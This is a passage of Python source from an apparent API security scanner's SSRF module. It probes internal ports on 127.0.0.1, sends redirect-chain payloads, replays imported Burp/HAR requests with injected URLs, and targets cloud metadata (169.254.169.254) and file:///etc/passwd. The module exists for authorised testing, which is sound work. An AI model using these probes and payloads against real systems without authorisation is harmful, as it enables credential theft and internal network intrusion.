            else:
                # Treat a complete failure (connection error / timeout) as a very
                # long response time so it does not skew the median downward.
                results.append((port, 0, 30_000.0))

        if not results:
            return []

        # Compute median response time across the full port set.
        all_times = [r[2] for r in results]
        median_ms: float = statistics.median(all_times)

        findings: List[Finding] = []

        for port, status_code, response_time_ms in results:
            # Emit when status is outside the 4xx range OR the response was
            # notably faster than the median (open port responds quickly while
            # unreachable ports hit the timeout ceiling).
            status_outside_4xx = status_code < 400 or status_code >= 500
            timing_anomaly = response_time_ms < (median_ms - 2000.0)

            if not (status_outside_4xx or timing_anomaly):
                continue

            # Skip probes that produced no response at all (status 0) unless
            # there is a genuine timing anomaly — status 0 means connection
            # failure, not an open port.
            if status_code == 0 and not timing_anomaly:
                continue

            self.logger.warning(
                "Potential open internal port detected via SSRF",
                endpoint=endpoint_url,
                port=port,
                status_code=status_code,
                response_time_ms=response_time_ms,
                median_ms=median_ms,
            )

            payload_str = f"http://127.0.0.1:{port}/"
            finding = Finding(
                id="",
                scan_id="",
                category="SSRF_PORT_SCAN",
                owasp_category="API7",
                severity=Severity.MEDIUM,
                endpoint=endpoint_url,
                method=method,
                status_code=status_code,
                response_size=0,
                response_time=response_time_ms / 1000.0,
                evidence=(
                    f"Internal port {port} appears reachable via SSRF probe "
                    f"(http://127.0.0.1:{port}/). "
                    f"Status code: {status_code}. "
                    f"Response time: {response_time_ms:.1f} ms. "
                    f"Median response time across all probed ports: {median_ms:.1f} ms. "
                    f"Endpoint: {endpoint_url}."
                ),
                recommendation=(
                    "Internal services reachable via SSRF may expose sensitive data or "
                    "allow lateral movement. Enforce an outbound allow-list that restricts "
                    "the server to only fetching permitted external URLs. Block loopback "
                    "(127.0.0.1, ::1) and RFC-1918 addresses at the network layer."
                ),
                payload=f"query={payload_str}",
            )
            deduped = self._dedup_finding(finding, f"127.0.0.1:{port}")
            if deduped is not None:
                findings.append(deduped)

        return findings

    async def _test_redirect_chain(
        self,
        endpoint_url: str,
        method: str,
        internal_probes: "List[InternalProbe]",
    ) -> "List[Finding]":
        """Redirect-chain SSRF detection (Requirements 8.1–8.3, 10.4).

        Tests for open-redirect-based SSRF by injecting two redirect-chain
        payload variants per internal probe into every ``SSRF_QUERY_PARAMS``
        and every ``SSRF_PRONE_HEADERS`` entry:

        1. **Credentials-prefix** — ``http://{probe.logical_target}@external.ssrf.test/``
           Exploits servers that parse the userinfo component before resolving the
           host, causing them to fetch the internal target instead of the external one.

        2. **Query-redirect** — ``http://external.ssrf.test/?next=http://{probe.logical_target}/``
           Exploits open redirectors where the server follows a redirect to the
           internal target encoded in a query parameter.

        When a response body matches any ``INTERNAL_TARGET_SIGNATURES`` entry the
        method emits ``SSRF_INTERNAL_ACCESS`` (CRITICAL) with evidence that names the
        specific redirect-chain technique used (Req 8.3).

        Early-return guards (in order):
        1. ``allow_port_scan=False`` — redirect-chain is an aggressive probe; skip
           when aggressive mode is not enabled (Req 8.2).
        2. ``safe_mode=True`` — skip redirect-chain probes even when aggressive mode
           is on (Req 10.4).

        All findings are routed through ``_dedup_finding()`` before being collected.

        Args:
            endpoint_url: The target endpoint URL.
            method: The HTTP method associated with the endpoint.
            internal_probes: Probe list from ``_build_probe_set()``.

        Returns:
            A (possibly empty) list of deduplicated :class:`Finding` objects.
        """
        # Guard 1: redirect-chain is an aggressive probe — skip when not opted in (Req 8.2).
        if not self.config.allow_port_scan:
            return []

        # Guard 2: safe mode always skips redirect-chain probes (Req 10.4).
        if self.config.safe_mode:
            return []

        findings: List[Finding] = []

        for probe in internal_probes:
            target = probe.logical_target

            # Build the two redirect-chain payload variants (Req 8.1).
            payloads = [
                (
                    f"http://{target}@external.ssrf.test/",
                    "credentials-prefix redirect-chain",
                ),
                (
                    f"http://external.ssrf.test/?next=http://{target}/",
                    "query-redirect redirect-chain",
                ),
            ]

            for payload, technique in payloads:
                for injection_type, probe_kwargs in (
                    (
                        "query",
                        {"params": {p: payload for p in SSRF_QUERY_PARAMS}},
                    ),
                    (
                        "header",
                        {"headers": {h: payload for h in SSRF_PRONE_HEADERS}},
                    ),
                ):
                    result = await self._probe(endpoint_url, method, **probe_kwargs)

                    if result is None:
                        continue

                    body = self._response_text(result)
                    matched = self._match_signature(body, INTERNAL_TARGET_SIGNATURES)

                    if matched is None:
                        continue

                    self.logger.warning(
                        "Potential redirect-chain SSRF detected",
                        endpoint=endpoint_url,
                        technique=technique,
                        injection_point=injection_type,
                        payload=payload,
                        matched_signature=matched,
                        status_code=result.status_code,
                    )

                    finding = Finding(
                        id="",
                        scan_id="",
                        category="SSRF_INTERNAL_ACCESS",
                        owasp_category="API7",
                        severity=Severity.CRITICAL,
                        endpoint=endpoint_url,
                        method=method,
                        status_code=result.status_code,
                        response_size=(
                            len(result.content) if result.content is not None else 0
                        ),
                        response_time=result.elapsed,
                        evidence=(
                            f"Internal target content reached via {technique} "
                            f"({injection_type} injection). "
                            f"Payload: '{payload}'. "
                            f"Signature matched: '{matched}'. "
                            f"Status: {result.status_code}."
                        ),
                        recommendation=(
                            "Redirect-chain SSRF allows attackers to reach internal targets "
                            "by exploiting open redirectors or URL-parsing ambiguities (e.g. "
                            "userinfo@ prefix). Validate and allow-list all outbound request "
                            "targets, disable automatic redirect following in server-side HTTP "
                            "clients, and reject URLs containing userinfo components or "
                            "redirect parameters pointing to internal addresses."
                        ),
                        payload=f"{injection_type}={payload}",
                    )

                    deduped = self._dedup_finding(finding, target)
                    if deduped is not None:
                        findings.append(deduped)

        return findings

    def _dedup_finding(self, finding: Finding, logical_target: str) -> Optional[Finding]:
        """Deduplicate findings by ``(endpoint_url, category, logical_target)``.

        This implements the deduplication tracker described in design §8 and
        required by Requirement 12.5. At most one Finding object is emitted per
        unique ``(endpoint, category, logical_target)`` combination within a
        single ``execute_tests`` call.

        Args:
            finding: The candidate finding to emit.
            logical_target: Canonical target string used as the third key
                component (e.g. ``"127.0.0.1"`` for all bypass variants).

        Returns:
            The *finding* unchanged when it is the first occurrence, or
            ``None`` when it is a duplicate (the new payload is appended to the
            existing finding's ``payload`` field separated by ``" | "``).
        """
        key = (finding.endpoint, finding.category, logical_target)
        if key in self._emitted:
            # Merge the new payload into the already-emitted finding.
            existing = self._emitted_findings[key]
            existing.payload = f"{existing.payload} | {finding.payload}"
            return None
        # First occurrence — record and pass through.
        self._emitted.add(key)
        self._emitted_findings[key] = finding
        return finding

    def _build_ssrf_body_fields(
        self,
        endpoint_url: str,
        method: str,
        imported_request: "Optional[Any]" = None,
    ) -> List[str]:
        """Resolve body field names via the priority chain (highest → lowest):

        1. ``extra_body_fields`` from ``--ssrf-body-field``
        2. ``url_like_fields`` from an ``ImportedRequest`` (Burp/HAR)
        3. OpenAPI/Swagger spec fields for this endpoint
        4. ``JSON_BODY_FIELDS`` generic fallback

        Deduplication preserves first-seen order.
        """
        seen: set = set()
        result: List[str] = []

        def _add(fields):
            for f in fields:
                if f not in seen:
                    seen.add(f)
                    result.append(f)

        # 1. Explicit user-supplied fields (highest priority).
        _add(self.config.extra_body_fields or [])

        # 2. Import-source detected fields.
        if imported_request is not None:
            _add(getattr(imported_request, "url_like_fields", []) or [])

        # 3. Spec-aware fields (only when no imported_request provided).
        if imported_request is None and self.spec_schema is not None:
            from urllib.parse import urlsplit
            path = urlsplit(endpoint_url).path or "/"
            operation = self.spec_schema.operation_for(path, method)
            if operation is not None:
                schema = operation.request_body_schema
                if schema and isinstance(schema.get("properties"), dict):
                    declared_props = list(schema["properties"].keys())
                    ssrf_prone_set = set(JSON_BODY_FIELDS)
                    URL_KEYWORDS = {"url", "uri", "host", "endpoint", "target",
                                    "webhook", "callback", "redirect", "link",
                                    "href", "src", "source", "dest", "destination",
                                    "fetch", "import", "feed", "avatar", "image",
                                    "thumbnail"}
                    spec_fields = [
                        f for f in declared_props
                        if f in ssrf_prone_set
                        or any(kw in f.lower() for kw in URL_KEYWORDS)
                    ]
                    _add(spec_fields)

        # 4. Generic fallback.
        _add(JSON_BODY_FIELDS)

        return result

    def _load_import_sources(self) -> "List[Any]":
        """Load all import sources and return a combined list of ImportedRequests.

        Raises ``ImportSourceError`` before any probes if a file is missing or
        unparseable (Requirement 12).
        """
        from utils.import_sources import BurpXmlImporter, HarImporter, ImportSourceError

        imported: List[Any] = []

        if self.config.burp_xml_path:
            self.logger.info(
                "Loading Burp XML import source",
                path=self.config.burp_xml_path,
            )
            parser = BurpXmlImporter(self.config.burp_xml_path)
            reqs = parser.parse()
            self.logger.info(
                "Burp XML loaded",
                path=self.config.burp_xml_path,
                requests_count=len(reqs),
            )
            imported.extend(reqs)

        if self.config.har_path:
            self.logger.info(
                "Loading HAR import source",
                path=self.config.har_path,
            )
            parser = HarImporter(self.config.har_path)
            reqs = parser.parse()
            self.logger.info(
                "HAR loaded",
                path=self.config.har_path,
                requests_count=len(reqs),
            )
            imported.extend(reqs)

        return imported

    async def _test_imported_request(
        self,
        imported_req: "Any",
        base_url: str,
        internal_probes: List[InternalProbe],
        scheme_probes: List[SchemeProbe],
    ) -> List[Finding]:
        """Full_Replay_Mode: probe an endpoint derived from an ImportedRequest.

        The original headers (auth, cookies, etc.) are preserved in every probe
        request. The body is reconstructed from the original with only URL-like
        field values replaced by each SSRF payload; non-URL fields keep their
        original values (Requirement 9).

        Args:
            imported_req: An ``ImportedRequest`` from Burp XML or HAR.
            base_url: The ``--target`` base URL to combine with the request path.
            internal_probes: Probe set from ``_build_probe_set()``.
            scheme_probes: Scheme probe set from ``_build_probe_set()``.

        Returns:
            List of deduplicated Finding objects.
        """
        method = imported_req.method

        # Safe mode: skip state-changing methods (Requirement 9.5).
        if self.config.safe_mode and method in STATE_CHANGING_METHODS:
            self.logger.debug(
                "Skipping imported request in safe mode",
                method=method,
                path=imported_req.path,
            )
            return []

        # No body → no body injection to do.
        if imported_req.body is None:
            return []

        # Build the full probe URL: target base + imported path (Requirement 10).
        # Strip scheme and host from the path if it is a full URL (Req 10.3).
        from urllib.parse import urlsplit, urlunsplit
        _path_parts = urlsplit(imported_req.path)
        if _path_parts.scheme and _path_parts.netloc:
            # Full URL — keep only path and query string.
            _raw_path = urlunsplit(("", "", _path_parts.path, _path_parts.query, ""))
        else:
            _raw_path = imported_req.path
        # Join without double slashes (Req 10.4): strip trailing slash from base,
        # ensure the path has a leading slash.
        probe_url = base_url.rstrip("/") + "/" + _raw_path.lstrip("/")

        # Resolve body fields with the imported request at priority level 2.
        body_fields = self._build_ssrf_body_fields(probe_url, method, imported_req)
        if not body_fields:
            return []

        findings: List[Finding] = []
        # Merge original headers as the base; add Content-Type if missing.
        # The imported request carries its own auth/cookie headers (Req 9.1), so
        # we temporarily clear the module-level auth context to prevent it from
        # overwriting the imported request's Authorization header.
        base_headers = dict(imported_req.headers)
        if not any(k.lower() == "content-type" for k in base_headers):
            base_headers["Content-Type"] = "application/json"

        _saved_auth = getattr(self.http_client, "current_auth_context", None)
        try:
            self.http_client.current_auth_context = None
        except AttributeError:
            _saved_auth = None

        CLOUD_METADATA_TARGETS = {"169.254.169.254", "metadata.google.internal"}

        try:
            for field_name in body_fields:
                for probe in internal_probes:
                    # Full-replay body: original fields + injected value.
                    body = dict(imported_req.body)
                    body[field_name] = probe.payload

                    result = await self._probe(
                        probe_url, method,
                        headers=base_headers,
                        json=body,
                    )

                    raw_finding = self._analyze_internal_response(
                        probe_url, method, probe.payload, result, "body"
                    )
                    if raw_finding is None:
                        continue

                    raw_finding.evidence = f"[replay:body:{field_name}] {raw_finding.evidence}"
                    raw_finding.payload = f"body[{field_name}]={probe.payload}"
                    raw_finding.method = method

                    status_code = result.status_code if result is not None else 0
                    is_2xx = 200 <= status_code < 300
                    sig_matched = (
                        self._match_signature(
                            self._response_text(result) if result else "",
                            INTERNAL_TARGET_SIGNATURES,
                        ) is not None
                    )

                    if probe.is_bypass and (sig_matched or is_2xx):
                        raw_finding.category = "SSRF_SCHEME_BYPASS"
                        raw_finding.severity = Severity.HIGH
                        raw_finding.recommendation = (
                            "Blocklist-based SSRF filters can be evaded with IP-encoding "
                            "bypass variants. Use an explicit allow-list."
                        )
                    elif probe.logical_target in CLOUD_METADATA_TARGETS and sig_matched:
                        raw_finding.category = "SSRF_CLOUD_METADATA"
                        raw_finding.severity = Severity.CRITICAL
                        raw_finding.recommendation = (
                            "Cloud instance metadata reachable via Full_Replay_Mode SSRF. "
                            "Block 169.254.169.254 at the network layer and use IMDSv2."
                        )

                    deduped = self._dedup_finding(raw_finding, probe.logical_target)
                    if deduped is not None:
                        findings.append(deduped)

                for probe in scheme_probes:
                    body = dict(imported_req.body)
                    body[field_name] = probe.payload

                    result = await self._probe(
                        probe_url, method,
                        headers=base_headers,
                        json=body,
                    )

                    file_finding = self._analyze_file_response(
                        probe_url, method, probe.payload, result, "body"
                    )
                    if file_finding is not None:
                        file_finding.evidence = (
                            f"[replay:body:{field_name}] {file_finding.evidence}"
                        )
                        file_finding.payload = f"body[{field_name}]={probe.payload}"
                        deduped = self._dedup_finding(file_finding, probe.scheme)
                        if deduped is not None:
                            findings.append(deduped)
                    elif result is not None and result.status_code < 500:
                        bypass_finding = Finding(
                            id="", scan_id="",
                            category="SSRF_SCHEME_BYPASS",
                            owasp_category="API7",
                            severity=Severity.HIGH,
                            endpoint=probe_url,
                            method=method,
                            status_code=result.status_code,
                            response_size=(
                                len(result.content) if result.content is not None else 0
                            ),
                            response_time=result.elapsed,
                            evidence=(
                                f"[replay:body:{field_name}] Scheme '{probe.scheme}://' "
                                f"via Full_Replay_Mode returned {result.status_code}."
                            ),
                            recommendation=(
                                "Disable dangerous URL schemes in server-side fetchers. "
                                "Allow-list only http:// and https://."
                            ),
                            payload=f"body[{field_name}]={probe.payload}",
                        )
                        deduped = self._dedup_finding(bypass_finding, probe.scheme)
                        if deduped is not None:
                            findings.append(deduped)

        finally:
            # Restore the module-level auth context after Full_Replay_Mode probes.
            if _saved_auth is not None or hasattr(self.http_client, "current_auth_context"):
                try:
                    self.http_client.current_auth_context = _saved_auth
                except AttributeError:
                    pass

        return findings

    def _build_probe_set(self) -> Tuple[List[InternalProbe], List[SchemeProbe]]:
        """
        Build the full probe set from config and module-level constants.

        InternalProbe list order:
          1. Built-in ``config.internal_targets`` — converted to InternalProbe objects.
          2. ``CLOUD_METADATA_PROBES`` — all cloud provider metadata endpoints.
          3. ``BYPASS_PROBES`` — IP-encoding bypass variants (only if ``bypass_encodings`` is True).
          4. ``config.additional_internal_targets`` — user-supplied targets, same conversion as #1.

        SchemeProbe list order:
          1. ``SSRF_SCHEMES`` — the module-level list of dangerous schemes.
          2. ``config.additional_schemes`` — user-supplied schemes, same conversion as #1.

        Returns:
            Tuple of (internal_probes, scheme_probes).
        """
        internal_probes: List[InternalProbe] = []

        # 1. Built-in internal_targets from config
        for target in (self.config.internal_targets or []):
            if "://" in target:
                payload = target
            else:
                payload = f"http://{target}/"
            internal_probes.append(InternalProbe(
                payload=payload,
                logical_target=target,
                extra_headers={},
                is_bypass=False,
            ))

        # 2. Cloud metadata probes (constant)
        internal_probes.extend(CLOUD_METADATA_PROBES)

        # 3. Bypass probes — only when bypass_encodings is enabled
        if self.config.bypass_encodings:
            internal_probes.extend(BYPASS_PROBES)

        # 4. User-supplied additional internal targets
        for target in (self.config.additional_internal_targets or []):
            if "://" in target:
                payload = target
            else:
                payload = f"http://{target}/"
            internal_probes.append(InternalProbe(
                payload=payload,
                logical_target=target,
                extra_headers={},
                is_bypass=False,
            ))

        # --- Scheme probes ---
        scheme_probes: List[SchemeProbe] = []

        def _scheme_probe_from_string(scheme: str) -> SchemeProbe:
            """Convert a raw scheme string (e.g. ``"file://"``) into a SchemeProbe."""
            if scheme.startswith("file:"):
                probe_payload = f"{scheme}//etc/passwd"
            else:
                probe_payload = f"{scheme}//127.0.0.1/"
            scheme_name = scheme.rstrip("/").split(":")[0]
            return SchemeProbe(payload=probe_payload, scheme=scheme_name)

        # 1. Module-level SSRF_SCHEMES constant
        for scheme in SSRF_SCHEMES:
            scheme_probes.append(_scheme_probe_from_string(scheme))

        # 2. User-supplied additional schemes
        for scheme in (self.config.additional_schemes or []):
            scheme_probes.append(_scheme_probe_from_string(scheme))

        return internal_probes, scheme_probes

    def _build_internal_payload(self, target: str) -> str:
        """Build a URL payload for an internal target."""
        if "://" in target:
            return target
        # Cloud-metadata hosts are typically reached over plain HTTP.
        return f"http://{target}/"

    def _build_file_payload(self, protocol: str) -> str:
        """Build a file/ftp-protocol payload pointing at a sensitive resource."""
        protocol = protocol.rstrip("/")
        if protocol.startswith("file:"):
            return f"{protocol}//etc/passwd"
        # ftp:// or other protocols
        return f"{protocol}//127.0.0.1/etc/passwd"

    async def _probe(self, endpoint_url: str, method: str,
                     params: Optional[Dict[str, str]] = None,
                     headers: Optional[Dict[str, str]] = None,
                     json: Optional[Dict[str, Any]] = None) -> Optional[Response]:
        """
        Issue a single probe request. Returns the Response or None on failure.
        Per-probe exceptions are logged at debug and swallowed so they do not
        abort the whole module.
        """
        try:
            kwargs: Dict[str, Any] = {}
            if params:
                kwargs['params'] = params
            if headers:
                kwargs['headers'] = headers
            if json is not None:
                kwargs['json'] = json
            return await self.http_client.request(method, endpoint_url, **kwargs)
        except Exception as e:
            self.logger.debug("SSRF probe request failed",
                              endpoint=endpoint_url,
                              method=method,
                              error=str(e))
            return None

    def _analyze_internal_response(self, endpoint_url: str, method: str, payload: str,
                                   response: Optional[Response],
                                   injection_point: str) -> Optional[Finding]:
        """
        Detect internal/metadata access. A finding is emitted when:
        - The response body contains an INTERNAL_TARGET_SIGNATURES match, OR
        - The response status code is in config.success_status_codes AND
          config.require_signature is False.

        When config.require_signature is True, plain 2xx responses without a
        body signature are suppressed — useful to reduce false positives on APIs
        that return 200 for any URL parameter regardless of what was fetched.

        config.success_status_codes controls which status codes count as a
        "success hit" (defaults to the full 2xx range 200-299).
        """
        if response is None:
            return None

        body = self._response_text(response)
        matched = self._match_signature(body, INTERNAL_TARGET_SIGNATURES)

        signature_hit = matched is not None
        success_codes = getattr(self.config, 'success_status_codes', list(range(200, 300)))
        success_hit = response.status_code in success_codes
        require_sig = getattr(self.config, 'require_signature', False)

        # When require_signature is True, plain success responses without a
        # body signature are not evidence of SSRF — suppress the finding.
        if require_sig:
            if not signature_hit:
                return None
        else:
            if not (signature_hit or success_hit):
                return None

        if signature_hit:
            evidence = (f"Internal target content reached via {injection_point} injection. "
                        f"Signature matched: '{matched}'. Status: {response.status_code}.")
        else:
            evidence = (f"Injected internal target returned a successful response "
                        f"({response.status_code}) via {injection_point} injection, "
                        f"indicating the server fetched the supplied target.")

        self.logger.warning("Potential SSRF internal access detected",
                            endpoint=endpoint_url,
                            injection_point=injection_point,
                            payload=payload)

        return Finding(
            id="",
            scan_id="",
            category="SSRF_INTERNAL_ACCESS",
            owasp_category="API7",
            severity=Severity.CRITICAL,
            endpoint=endpoint_url,
            method=method,
            status_code=response.status_code,
            response_size=len(response.content) if response.content is not None else 0,
            response_time=response.elapsed,
            evidence=evidence,
            recommendation="Validate and allow-list outbound request targets. Block access to "
                           "internal/loopback and cloud-metadata addresses, disable unused URL "
                           "fetch features, and do not reflect user-controlled hosts/headers into "
                           "server-side requests.",
            payload=f"{injection_point}={payload}"
        )

    def _analyze_file_response(self, endpoint_url: str, method: str, payload: str,
                               response: Optional[Response],
                               injection_point: str) -> Optional[Finding]:
        """
        Detect file-protocol access by matching file-system content signatures
        (e.g. /etc/passwd markers, directory listings) in the response body.
        """
        if response is None:
            return None

        body = self._response_text(response)
        matched = self._match_signature(body, FILE_PROTOCOL_SIGNATURES)

        if matched is None:
            return None

        self.logger.warning("Potential file-protocol access detected",
                            endpoint=endpoint_url,
                            injection_point=injection_point,
                            payload=payload)

        return Finding(
            id="",
            scan_id="",
            category="FILE_PROTOCOL_ACCESS",
            owasp_category="API7",
            severity=Severity.CRITICAL,
            endpoint=endpoint_url,
            method=method,
            status_code=response.status_code,
            response_size=len(response.content) if response.content is not None else 0,
            response_time=response.elapsed,
            evidence=(f"File-system content returned via {injection_point} injection of a "
                      f"file/ftp-protocol payload. Signature matched: '{matched}'. "
                      f"Status: {response.status_code}."),
            recommendation="Disable support for dangerous URL schemes (file://, ftp://, gopher://, "
                           "etc.) in server-side fetchers. Allow-list permitted schemes/hosts and "
                           "reject user-supplied protocol handlers.",
            payload=f"{injection_point}={payload}"
        )

    @staticmethod
    def _response_text(response: Response) -> str:
        """Safely extract text content from a response for signature matching."""
        if getattr(response, 'text', None):
            return response.text
        content = getattr(response, 'content', None)
        if content:
            try:
                return content.decode('utf-8', errors='ignore')
            except Exception:
                return ""
        return ""

    @staticmethod
    def _match_signature(body: str, signatures: List[str]) -> Optional[str]:
        """Return the first signature found in the body (case-insensitive)."""
        if not body:
            return None
        lowered = body.lower()
        for sig in signatures:
            if sig.lower() in lowered:
                return sig
        return None
